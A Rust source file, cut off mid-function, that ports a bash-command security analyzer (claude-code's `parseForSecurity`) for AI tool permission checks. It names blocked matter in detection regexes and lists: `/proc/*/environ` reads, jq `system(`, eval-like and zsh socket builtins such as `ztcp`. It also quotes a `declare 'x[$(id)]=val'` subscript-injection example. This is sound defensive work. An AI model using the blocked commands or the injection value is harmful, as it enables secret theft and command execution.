//! Tree-sitter AST bash-security analyzer — port of claude-code
//! `src/utils/bash/ast.ts` `parseForSecurity` / `parseForSecurityFromAst`.
//! Compiled only under the `bash-ast` feature.
//!
//! claude parses a bash command with tree-sitter and, when the parse succeeds,
//! extracts a flat list of simple commands for per-command permission matching
//! ([`ParseForSecurityResult::Simple`]); commands using a shell feature it
//! can't statically analyze are [`ParseForSecurityResult::TooComplex`] (→ ask);
//! when the parser is unavailable it returns [`ParseForSecurityResult::ParseUnavailable`]
//! (→ the legacy regex battery in [`crate::bash_security`]). `bashPermissions.ts`
//! routes these three verdicts (the legacy battery the port currently runs for
//! EVERY command is, in claude, only the `parse-unavailable` fallback).
//!
//! ## Incremental port status
//! PIECE 2a (this module's first commit): the verdict types + the PRE-CHECK gate
//! ([`pre_check_too_complex`], the regex differentials `parseForSecurityFromAst`
//! runs BEFORE trusting tree-sitter) + the [`parse_for_security`] skeleton. The
//! AST → simple-command extraction (`walkProgram` / `collectCommands` /
//! `walkCommand` / …, ~2000 lines of `ast.ts`) is NOT ported yet: until it is,
//! [`parse_for_security`] returns [`ParseForSecurityResult::ParseUnavailable`]
//! for any command that passes the pre-checks, so the caller keeps the legacy
//! battery (no behavior change — and the whole module is `bash-ast`-gated OFF by
//! default). Later pieces replace that stand-in with the real extraction and
//! wire the verdict into the permission decision.

use regex::Regex;
use std::collections::HashMap;
use std::sync::OnceLock;
use tree_sitter::Node;

/// One redirect on a simple command (TS `Redirect`, `ast.ts:25`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Redirect {
    /// Redirect operator (`>`, `>>`, `<`, `<<`, `>&`, `>|`, `<&`, `&>`, `&>>`, `<<<`).
    pub op: String,
    /// Redirect target (filename / fd / herestring body).
    pub target: String,
    /// Optional leading file descriptor (`2>` → `fd: Some(2)`).
    pub fd: Option<i64>,
}

/// A flattened simple command (TS `SimpleCommand`, `ast.ts:31`).
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct SimpleCommand {
    /// `argv[0]` is the command name; the rest are arguments with quotes resolved.
    pub argv: Vec<String>,
    /// Leading `VAR=val` assignments, in order.
    pub env_vars: Vec<(String, String)>,
    /// Output/input redirects.
    pub redirects: Vec<Redirect>,
    /// Original source span for this command (UI display).
    pub text: String,
}

/// Verdict of [`parse_for_security`] (TS `ParseForSecurityResult`, `ast.ts:42`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ParseForSecurityResult {
    /// Statically analyzable — the flat list of simple commands.
    Simple {
        /// The extracted simple commands (empty for an empty command).
        commands: Vec<SimpleCommand>,
    },
    /// Uses a shell feature we can't statically analyze → the caller must ask.
    TooComplex {
        /// Human-readable reason (byte-faithful to the TS `reason`).
        reason: String,
    },
    /// tree-sitter parse unavailable → the caller falls back to the legacy
    /// regex battery ([`crate::bash_security::bash_command_is_safe`]).
    ParseUnavailable,
}

// ── Pre-check regexes (TS `ast.ts:254-314`): tree-sitter/bash differentials
// detected on the RAW command before trusting tree-sitter's tokenization. ──

macro_rules! lazy_re {
    ($name:ident, $pat:expr) => {
        // `dead_code`: some regexes are consumed only by later port layers
        // (walker / semantic clusters); they are defined here so all const
        // patterns live together.
        #[allow(dead_code)]
        fn $name() -> &'static Regex {
            static RE: OnceLock<Regex> = OnceLock::new();
            RE.get_or_init(|| Regex::new($pat).expect("valid pre-check regex"))
        }
    };
}

// CONTROL_CHAR_RE: control chars bash drops but that confuse static analysis.
lazy_re!(control_char_re, r"[\x00-\x08\x0B-\x1F\x7F]");
// UNICODE_WHITESPACE_RE: invisible Unicode whitespace bash treats as a word char.
lazy_re!(
    unicode_whitespace_re,
    r"[\u{00A0}\u{1680}\u{2000}-\u{200B}\u{2028}\u{2029}\u{202F}\u{205F}\u{3000}\u{FEFF}]"
);
// BACKSLASH_WHITESPACE_RE: `\ `/`\t`, or `\<NL>` adjacent to a non-ws char.
lazy_re!(backslash_whitespace_re, r"\\[ \t]|[^ \t\n\\]\\\n");
// ZSH_TILDE_BRACKET_RE: zsh `~[name]` dynamic named-directory expansion.
lazy_re!(zsh_tilde_bracket_re, r"~\[");
// ZSH_EQUALS_EXPANSION_RE: word-initial `=cmd` zsh EQUALS expansion.
lazy_re!(zsh_equals_expansion_re, r"(?:^|[\s;&|])=[a-zA-Z_]");
// BRACE_WITH_QUOTE_RE: `{` + quote char (brace-expansion obfuscation), run on
// the brace-masked command so quoted JSON like `'{"k":"v"}'` doesn't trip it.
lazy_re!(brace_with_quote_re, r#"\{[^}]*['"]"#);

// ────────────────────────────────────────────────────────────────────────────
// L1: const sets + leaf helpers.
//
// Faithful 1:1 port of the `ast.ts` const sets (54-314, 2060-2204) and the leaf
// helpers (`containsAnyPlaceholder`, `stripRawString`, `tooComplex`,
// `resolveSimpleExpansion`, `applyVarToScope`, `nodeTypeId`). The walker clusters
// (`walkProgram`/`collectCommands`/…) consume these; they land in later layers,
// so [`parse_for_security`]'s stand-in is unchanged in this layer.
//
// `#[allow(dead_code)]` is set on the items the walkers will consume — they are
// not referenced yet in this layer (the parser stand-in is untouched).
// ────────────────────────────────────────────────────────────────────────────

// ── Placeholders (ast.ts:74,82) ──

/// Placeholder for a recursively-extracted `$()` in the outer argv (ast.ts:74).
const CMDSUB_PLACEHOLDER: &str = "__CMDSUB_OUTPUT__";
/// Placeholder for a `$VAR` reference to a tracked non-literal value (ast.ts:82).
const VAR_PLACEHOLDER: &str = "__TRACKED_VAR__";

// ── Structural / separator node-type sets (ast.ts:54,65,186,224) ──

/// Node types that nest commands (TS `STRUCTURAL_TYPES`, ast.ts:54).
#[allow(dead_code)]
pub(crate) const STRUCTURAL_TYPES: &[&str] =
    &["program", "list", "pipeline", "redirected_statement"];

/// Command-separator leaf tokens (TS `SEPARATOR_TYPES`, ast.ts:65). The final
/// member is a literal newline.
#[allow(dead_code)]
pub(crate) const SEPARATOR_TYPES: &[&str] = &["&&", "||", "|", ";", "&", "|&", "\n"];

/// Node types that mean "cannot be statically analyzed" (TS `DANGEROUS_TYPES`,
/// ast.ts:186). ORDER MATTERS: [`node_type_id`] indexes into it (TS
/// `DANGEROUS_TYPE_IDS = [...DANGEROUS_TYPES]`). Membership via `.contains`.
pub(crate) const DANGEROUS_TYPES: &[&str] = &[
    "command_substitution",
    "process_substitution",
    "expansion",
    "simple_expansion",
    "brace_expression",
    "subshell",
    "compound_statement",
    "for_statement",
    "while_statement",
    "until_statement",
    "if_statement",
    "case_statement",
    "function_definition",
    "test_command",
    "ansi_c_string",
    "translated_string",
    "herestring_redirect",
    "heredoc_redirect",
];

/// Redirect operator tokens, kind == canonical op (TS `REDIRECT_OPS`, ast.ts:224).
/// `<<` is NOT a member (heredocs go via the heredoc walker).
#[allow(dead_code)]
pub(crate) const REDIRECT_OPS: &[&str] =
    &[">", ">>", "<", ">&", "<&", ">|", "&>", "&>>", "<<<"];

// ── Variable-resolution sets (ast.ts:125,167) ──

/// Bash-set env vars whose value is shell-controlled (TS `SAFE_ENV_VARS`,
/// ast.ts:125). Resolvable to [`VAR_PLACEHOLDER`] only INSIDE strings.
pub(crate) const SAFE_ENV_VARS: &[&str] = &[
    "HOME",
    "PWD",
    "OLDPWD",
    "USER",
    "LOGNAME",
    "SHELL",
    "PATH",
    "HOSTNAME",
    "UID",
    "EUID",
    "PPID",
    "RANDOM",
    "SECONDS",
    "LINENO",
    "TMPDIR",
    "BASH_VERSION",
    "BASHPID",
    "SHLVL",
    "HISTFILE",
    "IFS",
];

/// Special shell vars (`$?`, `$$`, …) (TS `SPECIAL_VAR_NAMES`, ast.ts:167).
/// Deliberately EXCLUDES `@` and `*` (positional params are empty in a fresh
/// BashTool shell; a placeholder would lie).
pub(crate) const SPECIAL_VAR_NAMES: &[&str] = &["?", "$", "!", "#", "0", "-"];

// ── checkSemantics tail sets (ast.ts:2060-2204) — consumed by the semantic
// cluster (later layer); defined here so all const sets live in one place. ──

/// Zsh module builtins, catchable only by name (TS `ZSH_DANGEROUS_BUILTINS`,
/// ast.ts:2060).
#[allow(dead_code)]
pub(crate) const ZSH_DANGEROUS_BUILTINS: &[&str] = &[
    "zmodload", "emulate", "sysopen", "sysread", "syswrite", "sysseek", "zpty", "ztcp", "zsocket",
    "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp",
];

/// Builtins that evaluate their arguments as shell code (TS `EVAL_LIKE_BUILTINS`,
/// ast.ts:2086).
#[allow(dead_code)]
pub(crate) const EVAL_LIKE_BUILTINS: &[&str] = &[
    "eval", "source", ".", "exec", "command", "builtin", "fc", "coproc", "noglob", "nocorrect",
    "trap", "enable", "mapfile", "readarray", "hash", "bind", "complete", "compgen", "alias", "let",
];

/// Builtins → NAME-operand flags that evaluate array subscripts (TS
/// `SUBSCRIPT_EVAL_FLAGS`, ast.ts:2143). Value-vecs are insertion-ordered (the
/// matched flag is interpolated into the reason string).
#[allow(dead_code)]
pub(crate) const SUBSCRIPT_EVAL_FLAGS: &[(&str, &[&str])] = &[
    ("test", &["-v", "-R"]),
    ("[", &["-v", "-R"]),
    ("[[", &["-v", "-R"]),
    ("printf", &["-v"]),
    ("read", &["-a"]),
    ("unset", &["-v"]),
    ("wait", &["-p"]),
];

/// `[[ … ]]` arithmetic comparison operators (TS `TEST_ARITH_CMP_OPS`,
/// ast.ts:2169).
#[allow(dead_code)]
pub(crate) const TEST_ARITH_CMP_OPS: &[&str] = &["-eq", "-ne", "-lt", "-le", "-gt", "-ge"];

/// Builtins taking a bare NAME operand that may contain a subscript (TS
/// `BARE_SUBSCRIPT_NAME_BUILTINS`, ast.ts:2182).
#[allow(dead_code)]
pub(crate) const BARE_SUBSCRIPT_NAME_BUILTINS: &[&str] = &["read", "unset"];

/// `read` flags that consume the next token as data (TS `READ_DATA_FLAGS`,
/// ast.ts:2189).
#[allow(dead_code)]
pub(crate) const READ_DATA_FLAGS: &[&str] = &["-p", "-d", "-n", "-N", "-t", "-u", "-i"];

// ── Regexes specific to L1 (others already exist in the foundation) ──

// BARE_VAR_UNSAFE_RE (ast.ts:110): space, tab, newline, *, ?, [. JS allows a
// bare `[` in a char class; Rust `regex` requires `\[`.
lazy_re!(bare_var_unsafe_re, r"[ \t\n*?\[]");

// BRACE_EXPANSION_RE (ast.ts:245): {a,b} or {a..b}. (Consumed by walker layers.)
lazy_re!(brace_expansion_re, r"\{[^{}\s]*(,|\.\.)[^{}\s]*\}");
// PROC_ENVIRON_RE (ast.ts:2197): `.*` (procfs resolves `..`), NOT `[^/]*`.
lazy_re!(proc_environ_re, r"/proc/.*/environ");
// NEWLINE_HASH_RE (ast.ts:2204): newline, then 0+ space/tab, then `#`.
lazy_re!(newline_hash_re, "\n[ \t]*#");

// ── L2 regexes (ast.ts:1659, 1773, 1835, 1894-1896) ──

// ARITH_LEAF_RE (ast.ts:1659): safe leaf tokens inside `$((…))` — VERBATIM,
// anchored. Numeric literals + operator/paren tokens only; a bare variable_name
// leaf is rejected (arithmetic injection). The alternation members `[`/`]` are
// escaped for the Rust `regex` char-class (`\[`/`\]`).
lazy_re!(
    arith_leaf_re,
    r"^(?:[0-9]+|0[xX][0-9a-fA-F]+|[0-9]+#[0-9a-zA-Z]+|[-+*/%^&|~!<>=?:(),]+|<<|>>|\*\*|&&|\|\||[<>=!]=|\$\(\(|\)\))$"
);
// jq `system(` detector inside extractSafeCatHeredoc (ast.ts:1773): `/\bsystem\s*\(/`.
lazy_re!(jq_system_re, r"\bsystem\s*\(");
// Valid bash variable name (ast.ts:1835): `[A-Za-z_][A-Za-z0-9_]*`, anchored.
lazy_re!(valid_var_name_re, r"^[A-Za-z_][A-Za-z0-9_]*$");
// PS4 `${IDENT}` reference, stripped before the charset check (ast.ts:1896).
lazy_re!(ps4_dollar_brace_re, r"\$\{[A-Za-z_][A-Za-z0-9_]*\}");
// PS4 safe charset after stripping `${VAR}` refs (ast.ts:1895): A-Za-z0-9, space,
// `_ + : . / =`, `[`, `]`, and `-` (trailing → literal). `[`/`]` escaped for Rust.
lazy_re!(ps4_charset_re, r"^[A-Za-z0-9 _+:./=\[\]-]*$");
// declare/typeset/local flag that changes assignment semantics: -…[niaA]
// (nameref / integer / array), ast.ts:627.
lazy_re!(declare_flag_re, r"^-[a-zA-Z]*[niaA]");
// declare bare positional with an array subscript (`x[…]`), ast.ts:647.
lazy_re!(declare_subscript_re, r"^[^=]*\[");
// A `$<ident>` in node.text — a resolved simple_expansion (ast.ts:1350).
lazy_re!(dollar_ident_re, r"\$[A-Za-z_]");
// Chars that force shell-escape when rebuilding .text from argv (ast.ts:1353).
// Backtick, brackets and the metacharacter set; `[`/`]` escaped for Rust.
lazy_re!(shell_escape_re, "[\"'\\\\ \t\n$`;|&<>(){}*?\\[\\]~#]");

// ── Leaf helpers (ast.ts:94, 213, 2029, 2033, 1937, 2017) ──

/// TS `containsAnyPlaceholder` (ast.ts:94). SUBSTRING check (not equality) — a
/// composite like `prefix__CMDSUB_OUTPUT__` is non-literal.
#[must_use]
pub(crate) fn contains_any_placeholder(value: &str) -> bool {
    value.contains(CMDSUB_PLACEHOLDER) || value.contains(VAR_PLACEHOLDER)
}

/// TS `nodeTypeId` (ast.ts:213). Analytics-only (no security effect). `None` →
/// `-2` (pre-check); `"ERROR"` → `-1`; a [`DANGEROUS_TYPES`] member → its
/// insertion index + 1; anything else → `0`.
#[must_use]
pub fn node_type_id(node_type: Option<&str>) -> i32 {
    match node_type {
        None => -2,
        Some("ERROR") => -1,
        Some(nt) => DANGEROUS_TYPES
            .iter()
            .position(|t| *t == nt)
            .map_or(0, |i| i as i32 + 1),
    }
}

/// TS `stripRawString` (ast.ts:2029): drop the surrounding quotes of a
/// `raw_string` (`'…'`). JS `text.slice(1,-1)` strips first+last code unit; the
/// quotes are ASCII so we strip first+last CHAR (panic-free for odd input).
#[must_use]
#[allow(dead_code)]
pub(crate) fn strip_raw_string(text: &str) -> String {
    let mut c = text.chars();
    c.next();
    c.next_back();
    c.as_str().to_string()
}

/// TS `tooComplex` (ast.ts:2033). Builds the fail-closed verdict from a node.
/// The TS variant also carries `nodeType` (analytics-only); the ported enum has
/// only `reason`, so it is dropped. Reason strings are byte-faithful.
#[must_use]
#[allow(dead_code)]
pub(crate) fn too_complex(node: Node) -> ParseForSecurityResult {
    let t = node.kind();
    let reason = if t == "ERROR" {
        "Parse error".to_string()
    } else if DANGEROUS_TYPES.contains(&t) {
        format!("Contains {t}")
    } else {
        format!("Unhandled node type: {t}")
    };
    ParseForSecurityResult::TooComplex { reason }
}

/// TS `resolveSimpleExpansion` (ast.ts:1937). Resolve a `simple_expansion`
/// (`$VAR`) node against `var_scope`. `Ok(s)` = the resolved value (the real
/// literal for tracked literals, [`VAR_PLACEHOLDER`] for shell-controlled vars);
/// `Err(TooComplex)` = fail-closed. The bare-vs-`inside_string` asymmetry is the
/// core invariant (see the inline SECURITY notes in `ast.ts`).
#[allow(dead_code)]
pub(crate) fn resolve_simple_expansion(
    node: Node,
    src: &[u8],
    var_scope: &HashMap<String, String>,
    inside_string: bool,
) -> Result<String, ParseForSecurityResult> {
    let mut var_name: Option<String> = None;
    let mut is_special = false;
    let mut cursor = node.walk();
    for c in node.children(&mut cursor) {
        if c.kind() == "variable_name" {
            var_name = Some(c.utf8_text(src).unwrap_or("").to_string());
            break;
        }
        if c.kind() == "special_variable_name" {
            var_name = Some(c.utf8_text(src).unwrap_or("").to_string());
            is_special = true;
            break;
        }
    }
    let var_name = match var_name {
        Some(v) => v,
        None => return Err(too_complex(node)),
    };
    if let Some(tv) = var_scope.get(&var_name) {
        if contains_any_placeholder(tv) {
            // Non-literal: bare → reject, inside string → VAR_PLACEHOLDER.
            if !inside_string {
                return Err(too_complex(node));
            }
            return Ok(VAR_PLACEHOLDER.to_string());
        }
        // Pure literal — return it directly so downstream path validation sees
        // the REAL value. Bare args additionally reject empty / IFS+glob chars.
        if !inside_string {
            if tv.is_empty() {
                return Err(too_complex(node));
            }
            if bare_var_unsafe_re().is_match(tv) {
                return Err(too_complex(node));
            }
        }
        return Ok(tv.clone());
    }
    // Untracked: SAFE_ENV_VARS / special+positional vars resolvable only inside
    // strings (value is shell-controlled).
    if inside_string {
        if SAFE_ENV_VARS.contains(&var_name.as_str()) {
            return Ok(VAR_PLACEHOLDER.to_string());
        }
        if is_special
            && (SPECIAL_VAR_NAMES.contains(&var_name.as_str())
                || (!var_name.is_empty() && var_name.bytes().all(|b| b.is_ascii_digit())))
        {
            return Ok(VAR_PLACEHOLDER.to_string());
        }
    }
    Err(too_complex(node))
}

/// TS `applyVarToScope` (ast.ts:2017). Apply a `name=value` (or `+=` append) to
/// `var_scope`. If the combined value contains any placeholder it is stored as
/// [`VAR_PLACEHOLDER`] so a later `$name` correctly rejects as a bare arg.
#[allow(dead_code)]
pub(crate) fn apply_var_to_scope(
    var_scope: &mut HashMap<String, String>,
    name: &str,
    value: &str,
    is_append: bool,
) {
    let existing = var_scope.get(name).cloned().unwrap_or_default();
    let combined = if is_append {
        format!("{existing}{value}")
    } else {
        value.to_string()
    };
    let stored = if contains_any_placeholder(&combined) {
        VAR_PLACEHOLDER.to_string()
    } else {
        combined
    };
    var_scope.insert(name.to_string(), stored);
}

// ────────────────────────────────────────────────────────────────────────────
// L2: arg / value / assignment / heredoc walkers.
//
// Faithful 1:1 port of `ast.ts` walkArgument (1399), walkString (1508),
// walkArithmetic (1675), collectCommandSubstitution (1374),
// walkVariableAssignment (1777), extractSafeCatHeredoc (1721),
// walkHeredocRedirect (1143), walkHerestringRedirect (1211), walkTestExpr (962).
//
// Return convention mirrors the TS unions:
//   TS `string | ParseForSecurityResult`        → `Result<String, ParseForSecurityResult>`
//   TS `ParseForSecurityResult | null`          → `Option<ParseForSecurityResult>` (None = ok)
//   TS `string | 'DANGEROUS' | null`            → [`CatHeredoc`]
//   TS `{name,value,isAppend} | result`         → `Result<VarAssign, ParseForSecurityResult>`
//
// tree-sitter `Node` has no `.text`; `src: &[u8]` is threaded through every
// walker and node text read via `node.utf8_text(src).unwrap_or("")` (the
// pre-checks already rejected control / Unicode-ws, so invalid-UTF-8 is treated
// as "" defensively). `collect_commands` (the L3 statement-driver) is a DEP; a
// fail-closed stand-in is provided below until L3 lands.
// ────────────────────────────────────────────────────────────────────────────

/// TS `node.text` — the node's source span. utf8 failure (pre-checks already ran)
/// is treated as `""` defensively.
#[allow(dead_code)]
fn node_text<'a>(node: Node, src: &'a [u8]) -> &'a str {
    node.utf8_text(src).unwrap_or("")
}

/// Iterate ALL children of `node` (named + anonymous tokens), matching TS
/// `node.children`. One cursor per node (tree-sitter requirement).
#[allow(dead_code)]
fn children(node: Node<'_>) -> Vec<Node<'_>> {
    let mut cursor = node.walk();
    node.children(&mut cursor).collect()
}

/// A leading `name=value` / `name+=value` assignment (TS
/// `{name,value,isAppend}`, ast.ts:1781 return shape).
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
pub(crate) struct VarAssign {
    /// Variable name (validated `[A-Za-z_][A-Za-z0-9_]*`).
    pub name: String,
    /// Resolved value (literal, or a placeholder for cmdsub/unknown-var values).
    pub value: String,
    /// `+=` append (vs `=` set).
    pub is_append: bool,
}

/// TS `extractSafeCatHeredoc` return (ast.ts:1721) `string | 'DANGEROUS' | null`.
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
pub(crate) enum CatHeredoc {
    /// The heredoc body (a safe `$(cat <<'EOF' … EOF)` static result).
    Body(String),
    /// Body matched a dangerous pattern (`/proc/*/environ` or jq `system(`).
    Dangerous,
    /// Not a safe cat-heredoc shape (caller falls through to general `$()`).
    None,
}

/// TS `collectCommands` (ast.ts:482). Recursively collect leaf `command` nodes
/// from a structural wrapper node. `None` = success; `Some(err)` = fail-closed
/// on a disallowed node type. Mirrors the varScope-snapshot semantics: `&&`/`;`
/// carry scope linearly; `||`/`|`/`|&`/`&` reset to the entry snapshot; pipelines
/// run on a COPY so stages never mutate the caller's scope. Any unhandled node
/// type falls to the default `too_complex` (over-ask), NEVER silently succeeds.
#[allow(dead_code)]
pub(crate) fn collect_commands(
    node: Node,
    commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> Option<ParseForSecurityResult> {
    let kind = node.kind();

    if kind == "command" {
        // Pass `commands` as the innerCommands accumulator — any $() extracted
        // during walk_command gets appended alongside the outer command.
        match walk_command(node, &[], commands, var_scope, src) {
            ParseForSecurityResult::Simple { commands: cs } => {
                commands.extend(cs);
                return None;
            }
            other => return Some(other),
        }
    }

    if kind == "redirected_statement" {
        return walk_redirected_statement(node, commands, var_scope, src);
    }

    if kind == "comment" {
        return None;
    }

    if STRUCTURAL_TYPES.contains(&kind) {
        // SECURITY: `||`, `|`, `|&`, `&` must NOT carry varScope linearly (see
        // ast.ts:504 for the flag-omission attack). Snapshot the incoming scope;
        // reset to it after those separators. `&&`/`;` DO carry scope.
        let is_pipeline = kind == "pipeline";
        let mut needs_snapshot = false;
        if !is_pipeline {
            for c in children(node) {
                if c.kind() == "||" || c.kind() == "&" {
                    needs_snapshot = true;
                    break;
                }
            }
        }
        let snapshot: Option<HashMap<String, String>> =
            if needs_snapshot { Some(var_scope.clone()) } else { None };
        // For `pipeline`, ALL stages run in subshells → start with a COPY so
        // nothing mutates the caller's scope. For `list`/`program`, the `&&`/`;`
        // chain mutates the caller's scope; fork only on `||`/`&`.
        let mut owned_scope: Option<HashMap<String, String>> =
            if is_pipeline { Some(var_scope.clone()) } else { None };
        for child in children(node) {
            let ck = child.kind();
            if SEPARATOR_TYPES.contains(&ck) {
                if ck == "||" || ck == "|" || ck == "|&" || ck == "&" {
                    // `|`/`|&` only appear under `pipeline`; `||`/`&` under list.
                    let base = snapshot.as_ref().unwrap_or(&*var_scope);
                    owned_scope = Some(base.clone());
                }
                continue;
            }
            let scope: &mut HashMap<String, String> =
                owned_scope.as_mut().unwrap_or(var_scope);
            if let Some(err) = collect_commands(child, commands, scope, src) {
                return Some(err);
            }
        }
        return None;
    }

    if kind == "negated_command" {
        // `! cmd` inverts exit code only. Recurse into the wrapped command.
        for child in children(node) {
            if child.kind() == "!" {
                continue;
            }
            return collect_commands(child, commands, var_scope, src);
        }
        return None;
    }

    if kind == "declaration_command" {
        // `export`/`local`/`readonly`/`declare`/`typeset`.
        let mut argv: Vec<String> = Vec::new();
        for child in children(node) {
            match child.kind() {
                "export" | "local" | "readonly" | "declare" | "typeset" => {
                    argv.push(node_text(child, src).to_string());
                }
                "word" | "number" | "raw_string" | "string" | "concatenation" => {
                    let arg = match walk_argument(Some(child), src, commands, var_scope) {
                        Ok(s) => s,
                        Err(e) => return Some(e),
                    };
                    // SECURITY: declare/typeset/local flags that change assignment
                    // semantics (-n nameref, -i integer, -a/-A array) break the
                    // static model. Check the RESOLVED arg.
                    if (argv.first().map(String::as_str) == Some("declare")
                        || argv.first().map(String::as_str) == Some("typeset")
                        || argv.first().map(String::as_str) == Some("local"))
                        && declare_flag_re().is_match(&arg)
                    {
                        return Some(ParseForSecurityResult::TooComplex {
                            reason: format!(
                                "declare flag {arg} changes assignment semantics (nameref/integer/array)"
                            ),
                        });
                    }
                    // SECURITY: bare positional with a subscript also evaluates
                    // (`declare 'x[$(id)]=val'` runs $(id) in the subscript).
                    if (argv.first().map(String::as_str) == Some("declare")
                        || argv.first().map(String::as_str) == Some("typeset")
                        || argv.first().map(String::as_str) == Some("local"))
                        && !arg.starts_with('-')
                        && declare_subscript_re().is_match(&arg)
                    {
                        return Some(ParseForSecurityResult::TooComplex {
                            reason: format!(
                                "declare positional '{arg}' contains array subscript — bash evaluates $(cmd) in subscripts"
                            ),
                        });
                    }
                    argv.push(arg);
                }
                "variable_assignment" => {
                    let ev = match walk_variable_assignment(child, commands, var_scope, src) {
                        Ok(ev) => ev,
                        Err(e) => return Some(e),
                    };
                    // export/declare assignments populate the scope so later $VAR
                    // refs resolve.
                    let pair = format!("{}={}", ev.name, ev.value);
                    apply_var_to_scope(var_scope, &ev.name, &ev.value, ev.is_append);
                    argv.push(pair);
                }
                "variable_name" => {
                    // `export FOO` — bare name, no assignment.
                    argv.push(node_text(child, src).to_string());
                }
                _ => return Some(too_complex(child)),
            }
        }
        commands.push(SimpleCommand {
            argv,
            env_vars: Vec::new(),
            redirects: Vec::new(),
            text: node_text(node, src).to_string(),
        });
        return None;
    }

    if kind == "variable_assignment" {
        // Bare `VAR=value` at statement level — inert, no command pushed.
        let ev = match walk_variable_assignment(node, commands, var_scope, src) {
            Ok(ev) => ev,
            Err(e) => return Some(e),
        };
        apply_var_to_scope(var_scope, &ev.name, &ev.value, ev.is_append);
        return None;
    }

    if kind == "for_statement" {
        let mut loop_var: Option<String> = None;
        let mut do_group: Option<Node> = None;
        for child in children(node) {
            match child.kind() {
                "variable_name" => loop_var = Some(node_text(child, src).to_string()),
                "do_group" => do_group = Some(child),
                "for" | "in" | "select" | ";" => {}
                "command_substitution" => {
                    if let Some(err) =
                        collect_command_substitution(child, commands, var_scope, src)
                    {
                        return Some(err);
                    }
                }
                _ => {
                    // Iteration values: validated (value discarded; body uses
                    // VAR_PLACEHOLDER regardless).
                    if let Err(e) = walk_argument(Some(child), src, commands, var_scope) {
                        return Some(e);
                    }
                }
            }
        }
        let (loop_var, do_group) = match (loop_var, do_group) {
            (Some(v), Some(g)) => (v, g),
            _ => return Some(too_complex(node)),
        };
        // SECURITY: PS4/IFS as loop var bypasses assignment validation.
        if loop_var == "PS4" || loop_var == "IFS" {
            return Some(ParseForSecurityResult::TooComplex {
                reason: format!("{loop_var} as loop variable bypasses assignment validation"),
            });
        }
        // Loop var is ALWAYS unknown-value (VAR_PLACEHOLDER) in the REAL scope;
        // body uses a COPY so body assignments don't leak past `done`.
        var_scope.insert(loop_var, VAR_PLACEHOLDER.to_string());
        let mut body_scope = var_scope.clone();
        for c in children(do_group) {
            if matches!(c.kind(), "do" | "done" | ";") {
                continue;
            }
            if let Some(err) = collect_commands(c, commands, &mut body_scope, src) {
                return Some(err);
            }
        }
        return None;
    }

    if kind == "if_statement" || kind == "while_statement" {
        let mut seen_then = false;
        for child in children(node) {
            match child.kind() {
                "if" | "fi" | "else" | "elif" | "while" | "until" | ";" => continue,
                "then" => {
                    seen_then = true;
                    continue;
                }
                "do_group" => {
                    // while body: scope COPY (body assignments don't leak past
                    // done); inherits any `read VAR` tracking already in the real
                    // scope from the condition.
                    let mut body_scope = var_scope.clone();
                    for c in children(child) {
                        if matches!(c.kind(), "do" | "done" | ";") {
                            continue;
                        }
                        if let Some(err) = collect_commands(c, commands, &mut body_scope, src) {
                            return Some(err);
                        }
                    }
                    continue;
                }
                "elif_clause" | "else_clause" => {
                    let mut branch_scope = var_scope.clone();
                    for c in children(child) {
                        if matches!(c.kind(), "elif" | "else" | "then" | ";") {
                            continue;
                        }
                        if let Some(err) = collect_commands(c, commands, &mut branch_scope, src) {
                            return Some(err);
                        }
                    }
                    continue;
                }
                _ => {}
            }
            // Condition (seen_then=false) uses REAL varScope; then-body uses a COPY.
            let before = commands.len();
            if seen_then {
                let mut copy = var_scope.clone();
                if let Some(err) = collect_commands(child, commands, &mut copy, src) {
                    return Some(err);
                }
            } else {
                if let Some(err) = collect_commands(child, commands, var_scope, src) {
                    return Some(err);
                }
                // `while read VAR`: track condition `read VAR` names in REAL scope
                // (value UNKNOWN → VAR_PLACEHOLDER) so the body COPY inherits them.
                for i in before..commands.len() {
                    let c = &commands[i];
                    if c.argv.first().map(String::as_str) != Some("read") {
                        continue;
                    }
                    let names: Vec<String> = c.argv[1..]
                        .iter()
                        .filter(|a| {
                            !a.starts_with('-') && valid_var_name_re().is_match(a)
                        })
                        .cloned()
                        .collect();
                    for a in names {
                        // SECURITY: fail closed when a tracked literal would be
                        // overwritten by a `read` that may not execute.
                        if let Some(existing) = var_scope.get(&a) {
                            if !contains_any_placeholder(existing) {
                                return Some(ParseForSecurityResult::TooComplex {
                                    reason: format!(
                                        "'read {a}' in condition may not execute (||/pipeline/subshell); cannot prove it overwrites tracked literal '{existing}'"
                                    ),
                                });
                            }
                        }
                        var_scope.insert(a, VAR_PLACEHOLDER.to_string());
                    }
                }
            }
        }
        return None;
    }

    if kind == "subshell" {
        // `(cmd1; cmd2)` — isolated scope. Use a COPY of varScope.
        let mut inner_scope = var_scope.clone();
        for child in children(node) {
            if matches!(child.kind(), "(" | ")") {
                continue;
            }
            if let Some(err) = collect_commands(child, commands, &mut inner_scope, src) {
                return Some(err);
            }
        }
        return None;
    }

    if kind == "test_command" {
        // `[[ EXPR ]]` / `[ EXPR ]` — push synthetic command with argv[0]='[['.
        let mut argv: Vec<String> = vec!["[[".to_string()];
        for child in children(node) {
            if matches!(child.kind(), "[[" | "]]" | "[" | "]") {
                continue;
            }
            if let Some(err) = walk_test_expr(child, src, &mut argv, commands, var_scope) {
                return Some(err);
            }
        }
        commands.push(SimpleCommand {
            argv,
            env_vars: Vec::new(),
            redirects: Vec::new(),
            text: node_text(node, src).to_string(),
        });
        return None;
    }

    if kind == "unset_command" {
        // `unset FOO BAR`, `unset -f func`. Safe — only removes vars/functions.
        let mut argv: Vec<String> = Vec::new();
        for child in children(node) {
            match child.kind() {
                "unset" => argv.push(node_text(child, src).to_string()),
                "variable_name" => {
                    let name = node_text(child, src).to_string();
                    argv.push(name.clone());
                    // SECURITY: remove from varScope so later `$VAR` rejects.
                    var_scope.remove(&name);
                }
                "word" => {
                    let arg = match walk_argument(Some(child), src, commands, var_scope) {
                        Ok(s) => s,
                        Err(e) => return Some(e),
                    };
                    argv.push(arg);
                }
                _ => return Some(too_complex(child)),
            }
        }
        commands.push(SimpleCommand {
            argv,
            env_vars: Vec::new(),
            redirects: Vec::new(),
            text: node_text(node, src).to_string(),
